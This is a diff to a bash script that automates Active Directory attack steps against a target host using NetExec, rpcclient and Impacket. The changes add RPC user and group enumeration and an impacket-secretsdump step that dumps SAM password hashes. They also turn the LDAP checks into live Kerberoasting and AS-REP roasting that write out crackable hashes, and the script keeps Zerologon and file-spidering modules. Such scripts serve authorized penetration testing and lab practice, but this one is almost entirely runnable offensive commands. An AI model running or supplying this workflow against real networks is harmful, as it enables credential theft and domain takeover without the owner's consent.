@@ -40,13 +40,23 @@ echo -e "\n\033[96m[+] Validating credentials\033[0m\n"
 nxc smb $IP -d $domain -u $user -p $pass # Validate a  username and password against the SMB
 nxc ldap $IP -d $domain -u $user -p $pass # LDAP
 nxc winrm $IP -d $domain -u $user -p $pass # WinRM
-nxc rpc $IP -d $domain -u $user -p $pass # RPC
 nxc mssql $IP -u $user -p $pass # MSSQL
 nxc ssh $IP -u $user -p $pass # SSH
 nxc ftp $IP -u $user -p $pass # FTP
 nxc vnc $IP -u $user -p $pass # VNC
 # nxc rdp $IP -u $user -p $pass # RDP
 # nxc ftp $IP -u $user -p $pass # FTP
+
+echo -e "\n\033[96m[+] RPC Enumeration (rpcclient)\033[0m\n"
+rpcclient -U "$domain\\$user%$pass" $IP -c "queryuser 0" 2>/dev/null # RPC user query
+rpcclient -U "$domain\\$user%$pass" $IP -c "enumdomusers" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomusers.txt # Enumerate domain users via RPC
+rpcclient -U "$domain\\$user%$pass" $IP -c "enumdomgroups" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomgroups.txt # Enumerate domain groups via RPC
+
+echo -e "\n\033[96m[+] RPC Secrets Dump (impacket-secretsdump)\033[0m\n"
+impacket-secretsdump "$domain/$user:$pass@$IP" 2>/dev/null | tee nxc-enum/smb/rpc-secretsdump.txt # Dump SAM hashes via RPC
+
+echo -e "\n\033[96m[+] RPC Endpoint Dump (impacket-rpcdump)\033[0m\n"
+impacket-rpcdump "$IP" -u "$user" -p "$pass" -d "$domain" 2>/dev/null | tee nxc-enum/smb/rpc-rpcdump.txt # Query RPC endpoint information
 
 echo -e "\n\033[96m[+] Listing shared directories\033[0m\n"
 unbuffer nxc smb $IP -u $user -p $pass --shares | tee nxc-enum/smb/shares.txt # List shared directories on the target machine
@@ -119,11 +129,11 @@ unbuffer nxc ldap $IP -u $user -p $pass --users --password-not-required | tee nx
 echo -e "\n\033[91m[+] Trusted For Delegation\033[0m\n"
 unbuffer nxc ldap $IP -u $user -p $pass --users --trusted-for-delegation | tee nxc-enum/ldap/trusted-for-delegation.txt
 
-echo -e "\n\033[91m[+] Kerberoastable Users\033[0m\n"
-unbuffer nxc ldap $IP -u $user -p $pass --users --kerberoastable | tee nxc-enum/ldap/kerberoastable.txt
+echo -e "\n\033[91m[+] Kerberoasting\033[0m\n"
+unbuffer nxc ldap $IP -u $user -p $pass --kerberoasting nxc-enum/ldap/kerberoasting.txt
 
-echo -e "\n\033[91m[+] AS-REP Roastable Users\033[0m\n"
-unbuffer nxc ldap $IP -u $user -p $pass --users --asreproastable | tee nxc-enum/ldap/asreproastable.txt
+echo -e "\n\033[91m[+] AS-REProasting\033[0m\n"
+unbuffer nxc ldap $IP -u $user -p $pass --asreproast nxc-enum/ldap/asreproasting.txt
 
 echo -e "\n\033[91m[+] Domain Controllers\033[0m\n"
 unbuffer nxc ldap $IP -u $user -p $pass --dc-list | tee nxc-enum/ldap/domain-controllers.txt
@@ -133,8 +143,8 @@ echo -e "\n\033[96m[+] SMB Module Enumeration:\033[0m"
 echo -e "\n\033[91m[+] Spider Plus (Find Interesting Files)\033[0m\n"
 unbuffer nxc smb $IP -u $user -p $pass -M spider_plus | tee nxc-enum/smb/spider-plus.txt
 
-echo -e "\n\033[91m[+] Enumerate LSASS Protection\033[0m\n"
-unbuffer nxc smb $IP -u $user -p $pass -M enum_lsass | tee nxc-enum/smb/enum-lsass.txt
+# echo -e "\n\033[91m[+] Enumerate LSASS Protection\033[0m\n"
+# unbuffer nxc smb $IP -u $user -p $pass -M enum_lsass | tee nxc-enum/smb/enum-lsass.txt
 
 echo -e "\n\033[91m[+] Check Zerologon Vulnerability\033[0m\n"
 unbuffer nxc smb $IP -u $user -p $pass -M zerologon | tee nxc-enum/smb/zerologon.txt
@@ -164,7 +174,7 @@ echo -e "\n\033[91m[+] FTP Credentials Check\033[0m\n"
 unbuffer nxc ftp $IP -u $user -p $pass | tee nxc-enum/smb/ftp-credentials.txt
 
 echo -e "\n\033[91m[+] FTP Share Enumeration\033[0m\n"
-unbuffer nxc ftp $IP -u $user -p $pass --shares | tee nxc-enum/smb/ftp-shares.txt
+unbuffer nxc ftp $IP -u $user -p $pass --ls | tee nxc-enum/smb/ftp-shares.txt
 
 echo -e "\n\033[96m[+] VNC Enumeration:\033[0m"
 
